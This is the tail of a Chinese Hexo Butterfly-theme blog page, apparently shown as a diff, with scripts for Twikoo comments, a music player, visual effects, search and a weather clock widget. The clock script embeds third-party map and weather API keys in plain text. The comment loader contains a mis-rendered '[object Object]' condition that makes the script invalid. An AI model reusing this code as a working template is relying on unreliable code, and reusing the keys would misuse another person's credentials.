title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://linxiao-wangchuan.vercel.app/',
+      region: 'ap-shanghai',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, {"emotion":"twemoji","placeholder":"在此处输入评论"}))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://linxiao-wangchuan.vercel.app/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || ![object Object]) {
+    if ([object Object]) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="/js/sun_moon.js" async></script><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><div class="aplayer no-destroy" data-id="5183531430" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = '/2022/,/2023/,/2024/'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'eb7ef47cda914d65b0b394ce50c15242';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'true';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
